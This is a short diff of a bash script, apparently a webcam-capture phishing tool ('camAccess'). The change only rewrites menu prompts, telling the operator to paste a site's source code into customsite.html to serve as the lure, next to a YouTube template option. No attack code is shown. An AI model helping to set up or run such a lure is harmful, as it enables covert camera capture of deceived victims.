@@ -148,14 +148,20 @@ banner
 camAccess
 else
 printf "\n-----Choose a template----\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Custom Site\e[0m\n"
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Custom Site
+[@Please read first.
+ At first you have to edit file called customsite.html
+ Type nano customsite.html And then paste your site source code.]\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Youtube \e[0m\n"
 
 default_option_template="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Site url: \e[0m' fest_name
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] @Please read first.
+ At first you have to edit file called customsite.html
+ Type nano customsite.html And then paste your site source code.
+ \e[0m' fest_name
 fest_name="${fest_name//[[:space:]]/}"
 elif [[ $option_tem -eq 2 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
